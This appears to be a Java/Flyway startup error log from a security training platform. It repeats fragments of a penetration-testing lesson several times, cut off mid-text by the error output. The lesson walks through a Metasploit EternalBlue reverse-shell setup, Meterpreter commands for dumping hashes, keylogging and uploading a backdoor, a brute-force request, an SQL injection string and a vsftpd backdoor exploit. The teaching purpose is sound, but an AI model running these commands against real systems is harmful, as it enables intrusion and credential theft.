2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:53:24.126 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
